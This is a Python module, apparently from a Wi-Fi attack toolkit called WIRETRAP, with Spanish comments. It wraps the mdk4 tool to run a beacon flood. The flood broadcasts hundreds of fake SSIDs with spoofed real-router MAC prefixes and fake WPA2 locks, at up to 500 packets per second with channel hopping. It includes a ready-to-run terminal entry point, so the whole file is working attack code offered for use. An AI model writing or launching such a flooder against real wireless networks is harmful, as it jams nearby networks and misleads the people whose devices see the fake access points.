import subprocess
import threading
import time
import os
import sys

WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)


class BeaconFlooder:
    """
    Inunda el espectro 802.11 con cientos de SSIDs falsos usando mdk4.

    mdk4 b opciones relevantes:
      -m          MACs de OUIs reales (routers conocidos)
      -w a        Anunciar WPA2/AES (candado en el móvil)
      -s <pps>    Paquetes por segundo (default 50)
      -c <ch>     Canal fijo (omitir para rotar automáticamente)
      -h          Hop de canal real en la tarjeta (más compatible)

    Requiere interfaz en modo monitor con inyección y mdk4 instalado.
    """

    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self._proc = None
        self._thread = None

        # Configuración
        self.channel = 6
        self.rotate_channels = False
        self.pps = 200                # Paquetes por segundo
        self.announce_wpa2 = True

        # Callbacks GUI
        self.on_beacon_sent = None    # fn(count)
        self.on_stopped = None        # fn()
        self.on_error = None          # fn(msg)

    def _build_cmd(self):
        """Construye el comando mdk4 con los parámetros configurados."""
        cmd = ["mdk4", self.interface, "b",
               "-m",           # OUIs reales
               "-s", str(self.pps)]

        if self.announce_wpa2:
            cmd += ["-w", "a"]  # WPA2/AES

        if self.rotate_channels:
            cmd += ["-h"]       # Channel hop real en la tarjeta
        else:
            cmd += ["-c", str(self.channel)]

        return cmd

    def _monitor_loop(self):
        """Lee stdout de mdk4 y cuenta beacons enviados."""
        count = 0
        last_report = time.time()

        for line in self._proc.stdout:
            if not self.running:
                break
            decoded = line.decode("utf-8", errors="ignore").strip()

            # mdk4 imprime una línea por cada AP generado
            if decoded:
                count += 1

            now = time.time()
            if now - last_report >= 0.5:
                if self.on_beacon_sent:
                    self.on_beacon_sent(count)
                last_report = now

        # Proceso terminó
        if self.running:
            self.running = False
            rc = self._proc.poll()
            if rc and rc != 0 and self.on_error:
                self.on_error(f"mdk4 terminó con código {rc}")

        if self.on_stopped:
            self.on_stopped()

    def start(self, channel=6, pps=200,
              rotate_channels=False, announce_wpa2=True):
        """
        Inicia el beacon flood con mdk4 en un proceso separado.

        Args:
            channel:         Canal fijo (ignorado si rotate_channels=True)
            pps:             Paquetes por segundo (50–500)
            rotate_channels: Hop de canal real entre 1/6/11 y más
            announce_wpa2:   Anunciar cifrado WPA2 (candado en móvil)
        """
        if self.running:
            return

        self.channel = channel
        self.pps = max(10, min(500, pps))
        self.rotate_channels = rotate_channels
        self.announce_wpa2 = announce_wpa2

        cmd = self._build_cmd()

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
        except FileNotFoundError:
            if self.on_error:
                self.on_error("mdk4 no encontrado. Instálalo: sudo apt install mdk4")
            return
        except Exception as e:
            if self.on_error:
                self.on_error(str(e))
            return

        self.running = True
        self._thread = threading.Thread(
            target=self._monitor_loop,
            daemon=True
        )
        self._thread.start()

    def stop(self):
        """Detiene el flooding."""
        self.running = False

        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=3)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None

        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None


# ── Test en terminal ──────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 beacon_flood.py <interfaz_monitor>")
        print("Ejemplo: sudo python3 beacon_flood.py wlan0")
        sys.exit(1)

    iface = sys.argv[1]
    flooder = BeaconFlooder(iface)

    def on_sent(count):
        print(f"\r[*] Beacons enviados: {count}", end="", flush=True)

    def on_stopped():
        print("\n[!] Beacon flood detenido.")

    def on_error(msg):
        print(f"\n[!] Error: {msg}")

    flooder.on_beacon_sent = on_sent
    flooder.on_stopped = on_stopped
    flooder.on_error = on_error

    print(f"[*] Iniciando Beacon Flood en {iface}")
    print(f"    Ctrl+C para detener\n")

    try:
        flooder.start(channel=6, pps=200, rotate_channels=True)
        while flooder.running:
            time.sleep(1)
    except KeyboardInterrupt:
        flooder.stop()
